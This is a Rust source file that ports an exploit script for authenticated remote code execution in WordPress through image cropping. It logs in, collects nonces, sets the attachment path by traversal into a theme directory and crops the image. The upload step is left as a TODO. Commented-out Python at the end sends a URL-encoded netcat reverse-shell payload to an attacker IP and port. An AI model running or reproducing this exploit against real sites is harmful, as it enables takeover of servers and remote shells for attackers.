use anyhow::{anyhow, Result};
use regex::Regex;
use reqwest::blocking::Client;
use std::time::Duration;
use std::{env, process::exit};

fn main() -> Result<()> {
    let mut args: Vec<String> = env::args().collect();

    if args.len() != 5 {
        println!(
            "Usage:
    wordpress_image_rce <http://[IP]:[PORT]/> <Username> <Password> <WordPress_theme>"
        );
        exit(1);
    }

    let http_timeout = Duration::from_secs(10);
    let http_client = Client::builder()
        .timeout(http_timeout)
        .cookie_store(true)
        .build()?;

    let base_url = args.remove(1).trim_end_matches("/").to_string();
    let username = args.remove(1);
    let password = args.remove(1);
    let wp_theme = args.remove(1);
    let image_name = "gd.jpg".to_string();

    // lhost = '10.10.10.10' #attacker ip
    // lport = '4141' #listening port

    let date = chrono::Utc::now().format("%Y/%m/");

    let body1 = [
        ("log", username.clone()),
        ("pwd", password.clone()),
        ("wp-submit", "Log In".to_string()),
        ("redirect_to", format!("{}/wp-admin/", &base_url)),
        ("testcookie", "1".to_string()),
    ];
    let url1 = format!("{}/wp-login.php", &base_url);
    let res1 = http_client.post(url1).form(&body1).send()?;

    if res1.status().as_u16() == 200 {
        println!("[+] Login successful.");
    } else {
        return Err(anyhow!("[-] Failed to login."));
    }

    println!("[+] Getting Wp Nonce ... ");

    let url2 = format!("{}/wp-admin/media-new.php", &base_url);
    let regexp_res2 =
        Regex::new(r#"name="_wpnonce" value="(\w+)""#).expect("compiling regexp_res2");
    let res2 = http_client.get(url2).send()?;
    let body_res2 = res2.text()?;
    let mut wp_nonce_list: Vec<String> = regexp_res2
        .captures_iter(&body_res2)
        .filter_map(|captures| captures.get(0))
        .map(|wp_nonce| wp_nonce.as_str().to_string())
        .collect();

    if wp_nonce_list.len() == 0 {
        println!("[-] Failed to retrieve the _wpnonce");
        exit(1);
    }

    let wp_nonce = wp_nonce_list.remove(0);

    println!(
        "[+] Wp Nonce retrieved successfully ! _wpnonce : {}",
        &wp_nonce
    );

    println!("[+] Uploading the image ... ");

    // let body3 =   [
    //     ("name", "gd.jpg".to_string()),
    //     ("action", "upload-attachment".to_string()),
    //     ("_wpnonce", wp_nonce.clone()),
    //     ];

    // image = {'async-upload': (imagename, open(imagename, 'rb'))}
    // r_upload = requests.post(url+'wp-admin/async-upload.php', data=data, files=image, cookies=cookies)
    // if r_upload.status_code == 200:
    //     image_id = re.findall(r'{"id":(\d+),',r_upload.text)[0]
    //     _wp_nonce=re.findall(r'"update":"(\w+)"',r_upload.text)[0]
    //     print('[+] Image uploaded successfully ! Image ID :'+ image_id+"\n")
    // else :
    //     print("[-] Failed to receive a response for uploaded image ! try again . \n")
    //     exit(0)
    let image_id = String::new(); // TODO

    println!("[+] Changing the path ... ");

    let body4 = [
        ("_wpnonce", wp_nonce.clone()),
        ("action", "editpost".to_string()),
        ("post_ID", image_id.clone()),
        (
            "meta_input[_wp_attached_file]",
            format!(
                "{}{}?/../../../../themes/{}/rahali",
                &date, &image_name, &wp_theme
            ),
        ),
    ];
    let url4 = format!("{}/wp-admin/post.php", &base_url);
    let res4 = http_client.post(url4).form(&body4).send()?;
    if res4.status().as_u16() == 200 {
        println!("[+] Path has been changed successfully.");
    } else {
        println!("[-] Failed to change the path ! Make sure the theme is correcte .");
        exit(0);
    }

    println!("[+] Getting Ajax nonce ... ");

    let body5 = [
        ("action", "query-attachments"),
        ("post_id", "0"),
        ("query[item]", "43"),
        ("query[orderby]", "date"),
        ("query[order]", "DESC"),
        ("query[posts_per_page]", "40"),
        ("query[paged]", "1"),
    ];
    let regexp_res5 = Regex::new(r#","edit":"(\w+)""#).expect("compiling regexp_res5");
    let res5 = http_client
        .post(format!("{}/wp-admin/admin-ajax.php", &base_url))
        .form(&body5)
        .send()?;
    let res5_status = res5.status().as_u16();
    let body_res5 = res5.text()?;

    let mut ajax_nonce_list: Vec<String> = regexp_res5
        .captures_iter(&body_res5)
        .filter_map(|cap| cap.get(0))
        .map(|ajax_nonce| ajax_nonce.as_str().to_string())
        .collect();

    if res5_status != 200 || ajax_nonce_list.len() == 0 {
        println!("[-] Failed to retrieve ajax_nonce.");
        exit(0)
    }

    let ajax_nonce = ajax_nonce_list.remove(0);

    println!(
        "[+] Ajax Nonce retrieved successfully ! ajax_nonce : {}",
        &ajax_nonce
    );

    println!("[+] Cropping the uploaded image ...");

    let body6 = [
        ("action", "crop-image"),
        ("_ajax_nonce", &ajax_nonce),
        ("id", &image_id),
        ("cropDetails[x1]", "0"),
        ("cropDetails[y1]", "0"),
        ("cropDetails[width]", "200"),
        ("cropDetails[height]", "100"),
        ("cropDetails[dst_width]", "200"),
        ("cropDetails[dst_height],", "100"),
    ];
    let res6 = http_client
        .post(format!("{}/wp-admin/admin-ajax.php", &base_url))
        .form(&body6)
        .send()?;

    if res6.status().as_u16() == 200 {
        println!("[+] Done .");
    } else {
        println!("[-] Erorr ! Try again");
        exit(0);
    }

    println!("[+] Creating a new post to include the image... ");

    let res7 = http_client
        .post(format!("{}/wp-admin/post-new.php", &base_url))
        .send()?;

    // res = requests.post(url+'wp-admin/post-new.php', cookies=cookies)
    // if res.status_code == 200:
    //     _wpnonce = re.findall(r'name="_wpnonce" value="(\w+)"',res.text)[0]
    //     post_id = re.findall(r'"post":{"id":(\w+),',res.text)[0]
    //     print("[+] Post created successfully . \n")
    // else :
    //     print("[-] Erorr ! Try again \n")
    //     exit(0)

    // data={
    //     '_wpnonce':_wpnonce,
    //     'action':'editpost',
    //     'post_ID':post_id,
    //     'post_title':'RCE poc by v0lck3r',
    //     'post_name':'RCE poc by v0lck3r',
    //     'meta_input[_wp_page_template]':'cropped-rahali.jpg'
    // }
    // res = requests.post(url+'wp-admin/post.php',data=data, cookies=cookies)
    // if res.status_code == 200:
    //     print("[+] POC is ready at : "+url+'?p='+post_id+'&0=id\n')
    //     print("[+] Executing payload !")
    //     requests.get(f"{url}?p={post_id}&0=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20{lhost}%20{lport}%20%3E%2Ftmp%2Ff",cookies=cookies)

    // else :
    //     print("[-] Erorr ! Try again (maybe change the payload) \n")
    //     exit(0)

    Ok(())
}
